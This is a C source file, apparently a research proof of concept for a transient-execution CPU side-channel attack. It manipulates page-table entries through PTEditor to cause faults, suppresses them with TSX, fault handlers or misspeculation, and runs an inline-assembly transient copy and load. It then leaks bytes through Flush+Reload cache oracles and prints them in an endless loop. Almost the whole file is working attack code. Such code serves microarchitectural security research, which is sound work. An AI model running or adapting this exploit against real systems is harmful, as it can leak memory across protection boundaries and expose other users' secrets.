#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <memory.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include "../../cacheutils.h"
#include "../../PTEditor/ptedit_header.h"

#ifndef OFFSET
#define OFFSET "0"
#endif

#define PAGE_SIZE    4096

uint8_t __attribute__((aligned(PAGE_SIZE))) oracle1[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) oracle2[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) oracle3[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) src_page[4096];
uint8_t __attribute__((aligned(PAGE_SIZE))) dst_page[4096];

void transient();

void * noncanon = (void*)0x5678ff0000000000ull,
     * nulladdr = (void*)NULL,
     * ptr_read, *ptr_write, *ptr_target;


void setup_oracle(){
  memset(oracle1, 0, sizeof(oracle1));
  memset(oracle2, 0, sizeof(oracle2));
  memset(oracle3, 0, sizeof(oracle3));

  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);
}


void setup_fh(){
  signal(SIGSEGV, trycatch_segfault_handler);
  signal(SIGFPE, trycatch_segfault_handler);
}


#if SUP_SPECUL
uint8_t  __attribute__((aligned(PAGE_SIZE))) throttle[8 * 4096];
void speculate_transient(int run) {
  flush(&run);
  for (int i = 0; i < 8; i++) {
      flush(throttle + i * 4096);
  }
  if((run / 2.0 / throttle[0] / throttle[4096] / throttle[8192] / throttle[3 * 4096]) >
      (throttle[4 * 4096] / throttle[5 * 4096] / throttle[6 * 4096] / throttle[7 * 4096]))
  {
      transient();
  }
}
#endif



int main(int argc, char *argv[1]){
  setup_oracle();
  setup_fh();
  ptedit_init();

  #if SUP_SPECUL
  for (int i = 0; i < 8; i++) {
    throttle[i * 4096] = 1;
  }
  #endif


  memset(src_page, 0, PAGE_SIZE);
  memset(dst_page, 'D', PAGE_SIZE);

  ptr_target = dst_page;

  #if FAULTASSIST_S
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_USER);
  #elif FAULTASSIST_P
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_PRESENT);
  #elif FAULTASSIST_A
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_ACCESSED);
  #elif FAULTASSIST_NONCAN
  ptr_target = noncanon;
  #endif


  ptedit_cleanup();

  size_t leaks = 0;

  while(1){

    ptr_read = src_page;


  #if SUP_SPECUL

    ptr_write = src_page;
    for(int i = 0; i < 64; i++){
      speculate_transient(10);
    }

    ptr_write = ptr_target;
    speculate_transient(0);
  #else


  ptr_write = ptr_target;


  #if SUP_TSX
    if (xbegin() == (~0u)) {
  #elif SUP_FH
    if(!setjmp(trycatch_buf)){
  #else
  {
  #endif
      maccess(0);
      transient();


  #if SUP_TSX
    xend();
  #endif
    }

  #endif

#if !LEAK_3BYTES

    for (size_t i = 1 ; i < 256; i++) {
      if (flush_reload((uint8_t*) oracle1 + 4096 * i)) {
        if (i != 0) {
          fprintf(stdout, "%02x: %c\n", (unsigned int)i, (uint8_t) (i >= 32 ? i : '?'));
          fflush(stdout);
        }
      }
    }

#else
    for (int i = 'A'; i <= 'Z'; i++) {
      if (flush_reload((uint8_t*) oracle1 + 4096 * i)) {
        for (int j = 'A' ; j <= 'Z'; j++) {
          if (flush_reload((uint8_t*) oracle2 + 4096 * j)) {
            for (int k = 'A'; k <= 'Z'; k++) {
              if (flush_reload((uint8_t*) oracle3 + 4096 * k)) {
                fprintf(stdout, "%02x %02x %02x: ", (uint8_t) i, (uint8_t)j, (uint8_t)k);
                fprintf(stdout, "%c%c%c\n", (uint8_t) i, (uint8_t)j, (uint8_t)k);
                fflush(stdout);
              }
            }
          }
        }
      }
    }

    mfence();
#endif

  }
}

void  transient(){
  asm volatile(
    "mov $1, %%rcx\n"
    "rep movsb\n"
#if XMMLOAD
    "movups " OFFSET "(%%rdi), %%xmm0\n"
    "movq %%xmm0, %%rax\n"
#elif YMMLOAD
    "vmovups " OFFSET "(%%rdi), %%ymm0\n"
    "vpextrq $1, %%xmm0, %%rax\n"
#else
    "mov 8(%%rdi), %%rax\n"
#endif
    "mov %%rax, %%rbx\n"
    "mov %%rax, %%rcx\n"
    "and $0xff, %%rax\n"
    "shlq $12, %%rax\n"
    "movb (%2,%%rax,1), %%al\n"

#if LEAK_3BYTES
    "and $0xff00, %%rbx\n"
    "shlq $4, %%rbx\n"
    "movb (%3,%%rbx,1), %%al\n"

    "and $0xff0000, %%rcx\n"
    "shr $4, %%rcx\n"
    "movb (%4,%%rcx,1), %%al\n"
#endif
  : : "D"(ptr_write), "S"(ptr_read), "r"(oracle1), "r"(oracle2), "r"(oracle3), "d"(0) :
      "rax", "rcx", "rbx", "memory");
}
